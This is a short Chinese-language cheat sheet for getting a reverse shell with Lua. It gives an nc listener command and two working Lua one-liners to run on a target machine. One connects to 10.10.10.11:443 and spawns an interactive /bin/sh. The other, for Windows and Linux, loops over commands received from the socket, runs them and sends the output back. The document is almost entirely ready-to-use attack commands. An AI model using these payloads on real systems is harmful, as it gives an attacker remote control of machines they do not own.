# Lua脚本反弹shell

首先在本地监听TCP协议443端口

```bash
nc -lvp 443

```

然后在靶机上执行如下命令：Linux平台：

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.11','443');os.execute('/bin/sh -i <&3 >&3 2>&3');"

```

Windows及Linux平台：

```bash
lua5.1 -e 'local host, port = "10.10.10.11", 443 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

```

